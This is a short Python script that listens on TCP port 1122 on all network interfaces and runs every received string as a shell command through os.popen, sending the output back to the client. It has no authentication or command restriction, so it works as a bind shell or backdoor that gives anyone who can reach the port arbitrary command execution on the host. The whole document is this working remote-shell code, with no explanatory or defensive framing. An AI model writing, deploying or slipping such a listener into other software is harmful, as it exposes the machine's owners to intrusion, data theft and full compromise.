from socket import *
import os
HOST=''
PORT=1122
BUFSIZ=1024
ADDR=(HOST, PORT)
sock=socket(AF_INET, SOCK_STREAM)
sock.bind(ADDR)
sock.listen(1)
cease=False
while not cease:
    tcpClientSock, addr=sock.accept()
    while True:
        try:
            information=tcpClientSock.recv(BUFSIZ)
        except:
            tcpClientSock.close()
            break
        cease=(information.decode('utf8').upper() == "QUIT")
        if cease:
            break
        xinxin = os.popen(information.decode('utf8'))
        result = xinxin.read()
        tcpClientSock.sendall(result.encode('utf8'))
tcpClientSock.close()
sock.close()